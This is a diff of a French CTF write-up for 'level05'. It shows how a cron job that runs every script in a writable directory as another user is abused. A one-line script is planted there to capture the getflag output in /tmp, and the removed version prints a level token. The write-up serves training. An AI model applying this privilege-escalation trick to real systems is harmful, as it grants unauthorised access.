@@ -1,46 +1,42 @@
 # Rapport CTF - [level05]
 
-1. ### Objectif 1 - Recherche du fichier "mail"
-   - **Description :** L'épreuve consistait à rechercher le fichier "mail" pour trouver des informations importantes.
-   - **Solution :** Les étapes suivantes ont été réalisées :
-     - Utilisation de la commande `find / -type d -name "mail" 2> /dev/null` pour trouver le répertoire contenant les fichiers de courrier.
-     - Navigation vers le répertoire `/var/mail`.
-     - Consultation du contenu du fichier "level05" avec `cat level05`.
 
-2. ### Objectif 2 - Analyse du contenu du mail
-   - **Description :** Analyser le contenu du mail pour comprendre les informations relatives à l'exécution d'un programme.
-   - **Solution :** Les étapes suivantes ont été suivies :
-     - Lecture du contenu du fichier "level05".
-     - Identification de la planification de l'exécution du programme "openarenaserver" toutes les 2 minutes.
+### Observation:
+Quand nous rentrons dans le level nous avons un message qui nous informe que nous avons un mail 
+Nous allons donc essayer de le trouver avec la commande suivante: `find / -type d -name "mail" 2> /dev/null`
 
-3. ### Objectif 3 - Analyse du script "openarenaserver"
-   - **Description :** Analyser le script "openarenaserver" pour comprendre son fonctionnement.
-   - **Solution :** Les étapes suivantes ont été réalisées :
-     - Affichage du contenu du script "openarenaserver" avec `cat /usr/sbin/openarenaserver`.
-     - Observation que le script exécute tous les programmes dans le répertoire "/opt/openarenaserver" puis les supprime.
-     - Vérification des permissions du script (permissions "rwxr-x---+").
+On trouve un exécutable a `/var/mail` qui se nomme `level05`
 
-4. ### Objectif 4 - Création d'un programme malveillant
-   - **Description :** Créer un programme malveillant pour exploiter les privilèges du script "openarenaserver".
-   - **Solution :** Les étapes suivantes ont été effectuées :
-     - Création d'un nouveau fichier "test.sh" avec `echo > test.sh`.
-     - Édition du fichier "test.sh" avec `vim test.sh` et ajout du code suivant :
-       ```bash
-       #!/bin/bash
+On comprend que c'est un exécutable qui exécute tout ce qu'il y a dans le fichier openarenaserver
 
-       # Commande dont vous souhaitez obtenir le résultat
-       commande="getflag"
 
-       # Chemin complet du fichier de sortie dans /tmp
-       fichier_sortie="/tmp/resultat.txt"
+### Code:
+Nous ne pouvons pas l'exécuter, car nous n'avons pas les droits suffisants. \
+Mais si on le cat nous obtenons: 
+```sh
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
 
-       # Exécute la commande et redirige la sortie vers le fichier de sortie
-       $commande > $fichier_sortie
-       ```
-     - Attendre que le script "openarenaserver" exécute "test.sh" toutes les 2 minutes.
+Nous pouvons voir que c'est une commande cron tab qui est exécuter toutes les 2 min et qui lance le programme `/usr/sbin/openarenaserver`
 
-5. ### Objectif 5 - Obtention du flag
-   - **Description :** Obtenir le flag en exécutant le programme malveillant "test.sh".
-   - **Solution :** Les étapes suivantes ont été réalisées :
-     - Navigation vers le répertoire "/tmp".
-     - Affichage du contenu du fichier "resultat.txt" avec `cat resultat.txt` pour obtenir le token : "viuaaale9huek52boumoomioc".
+Si maintenant, nous regardons `cat /usr/sbin/openarenaserver`: 
+``` bash
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+(ulimit -t 5; bash -x "$i")
+rm -f "$i"
+done
+```
+
+Ce programme exécute tous les exécutables qui se trouvent dans `/opt/openarenaserver/` puis les supprimes.
+
+
+### Solution :
+Nous devons donc créer un exécutable qui se trouve dans `/opt/openarenaserver/`, qui vas utiliser `getflag` et l'envoyer dans un fichier texte pour pouvoir lire le mot de passe de level06  
+On ajoute le code suivant : `echo "getflag > /tmp/resultat.txt" > /opt/openarenaserver/test.sh`
+
+Puis on attend que le script cron tab exécute "test.sh" toutes les 2 minutes.
+
+Il ne nous reste plus qu'à `cat /tmp/resultat.txt` pour obtenir le mot de passe de level06 sans passer par le flag05
+
